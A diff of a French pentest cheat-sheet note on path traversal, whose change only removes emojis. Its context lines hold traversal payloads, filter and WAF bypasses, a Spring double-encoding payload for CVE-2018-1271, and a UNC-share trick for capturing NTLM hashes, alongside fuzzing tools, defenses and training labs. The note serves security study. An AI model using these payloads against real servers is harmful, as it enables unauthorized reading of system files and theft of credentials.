@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🛣️ Path Traversal (Directory Traversal)
+# Path Traversal (Directory Traversal)
 
 > [!info] **En 1 phrase**
 > Path Traversal = **lire un fichier hors de la racine web** en manipulant le chemin passé
@@ -20,7 +20,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -32,14 +32,14 @@ flowchart LR
     E --> F
 ```
 
-> [!info] 💡 **La différence clé avec LFI**
+> [!info] **La différence clé avec LFI**
 > Le **Path Traversal** exploite un mécanisme de **lecture** de fichier → on lit `/etc/passwd`.
 > La **File Inclusion** exécute un `include()` → c'est ce qui permet la **RCE**. Un point
-> d'inclusion = un plus gros potentiel. Voir [[LFI - Local File Inclusion|📂 LFI]] et [[RFI - Remote File Inclusion|🌐 RFI]].
+> d'inclusion = un plus gros potentiel. Voir [[LFI - Local File Inclusion| LFI]] et [[RFI - Remote File Inclusion| RFI]].
 
 ---
 
-## 🧪 Traversal de base
+## Traversal de base
 
 Payload de référence (fichiers de test : `/etc/passwd`, `C:\Windows\win.ini`) :
 
@@ -60,7 +60,7 @@ http://example.com/index.php?page=....//....//etc/passwd
 
 ### Null Byte (`%00`)
 
-> [!warning] ⚠️ Ne marche que sur **PHP < 5.3.4**. Le caractère null termine la chaîne C → on coupe le suffixe ajouté par l'app (ex: `.php`).
+> [!warning] Ne marche que sur **PHP < 5.3.4**. Le caractère null termine la chaîne C → on coupe le suffixe ajouté par l'app (ex: `.php`).
 
 ```url
 http://example.com/index.php?page=../../../etc/passwd%00
@@ -118,13 +118,13 @@ http://example.com/index.php?page=...\.\...\.\...\.\etc\passwd
 http://example.com/index.php?page=/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
-> [!tip] 💡 **WAF `str_replace("../","")` non récursif**
+> [!tip] **WAF `str_replace("../","")` non récursif**
 > `....//` → suppression de `../` → il reste `../` → le traversal passe. Dupliquer les motifs
 > quand le filtre est appliqué **une seule fois** (non récursif).
 
 ---
 
-## 🪟 Cas Windows
+## Cas Windows
 
 > La cible Windows utilise des **backslashes** et des fichiers spécifiques.
 > `win.ini` et `license.rtf` existent partout → parfaits pour un **proof of concept**.
@@ -162,12 +162,12 @@ Double encodage (Spring MVC — CVE-2018-1271) :
 {{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
 ```
 
-> [!tip] 💡 **UNC Share** : injecter un partage `\\localhost\c$\windows\win.ini` peut forcer le
+> [!tip] **UNC Share** : injecter un partage `\\localhost\c$\windows\win.ini` peut forcer le
 > serveur à **s'authentifier** sur notre partage → capture de hashes **NTLM** (relay/offline).
 
 ---
 
-## 🗂️ Fichiers utiles (Linux)
+## Fichiers utiles (Linux)
 
 ### OS & infos
 
@@ -227,7 +227,7 @@ Double encodage (Spring MVC — CVE-2018-1271) :
 
 ---
 
-## 🧰 Outils & Fuzzing
+## Outils & Fuzzing
 
 | Outil | Usage |
 |---|---|
@@ -260,7 +260,7 @@ shortscan http://example.org/
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -271,31 +271,31 @@ shortscan http://example.org/
 | **chroot / conteneur** | Isoler la racine accessible du serveur web |
 | **Surveillance** | Logs des patterns `../`, `%2e%2e`, `etc/passwd` dans les requêtes |
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!warning] ⚠️ **Connaître le chemin exact**
+> [!warning] **Connaître le chemin exact**
 > Si l'app ajoute un **préfixe** (`pages/`) ou un **suffixe** (`.php`), `../../../etc/passwd` échoue.
 > Il faut alors : null byte (PHP < 5.3.4), path truncation, ou un **chemin absolu** (`/etc/passwd`).
 > Sans connaissance du chemin, **fuzzer** (`ffuf`, `dotdotpwn`) ou lire les messages d'erreur.
 
-> [!tip] 💡 **Ne pas trop remonter**
+> [!tip] **Ne pas trop remonter**
 > Un seul `../` de trop et la lecture échoue silencieusement. Tester plusieurs profondeurs
 > (3, 5, 7...) — beaucoup de frameworks ont un docroot fixe (`../../../../` est souvent suffisant).
 
-> [!tip] 💡 **Traversal ≠ Inclusion**
+> [!tip] **Traversal ≠ Inclusion**
 > Un path traversal lit un fichier **brut** ; une inclusion l'**exécute**. Si le point
-> d'entrée est un `include()`/`require()` (PHP), basculer sur [[LFI - Local File Inclusion|📂 LFI]] pour viser la **RCE**.
+> d'entrée est un `include()`/`require()` (PHP), basculer sur [[LFI - Local File Inclusion| LFI]] pour viser la **RCE**.
 
 ---
 
-## 🧪 Labs
+## Labs
 
 - PortSwigger — File path traversal : https://portswigger.net/web-security/all-labs#file-path-traversal
 - Root-Me — LFI Double encoding : https://www.root-me.org/
 
 ---
 
-> [!info] 📚 **Sources**
+> [!info] **Sources**
 > - [PayloadsAllTheThings — Directory & Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20and%20Path%20Traversal/README.md)
 
-➡️ **Liens :** [[LFI et RFI|📂 Hub LFI/RFI]] · [[LFI - Local File Inclusion|📂 LFI]] · [[RFI - Remote File Inclusion|🌐 RFI]] · [[Injection SQL|💾 SQLi]] · [[SSRF|🌐 SSRF]] · [[03 - Exploitation Web|🌍 Exploitation Web]] · [[Bibliothèque technique|🏠 Index]]
+**Liens :** [[LFI et RFI| Hub LFI/RFI]] · [[LFI - Local File Inclusion| LFI]] · [[RFI - Remote File Inclusion| RFI]] · [[Injection SQL| SQLi]] · [[SSRF| SSRF]] · [[03 - Exploitation Web| Exploitation Web]] · [[Bibliothèque technique| Index]]
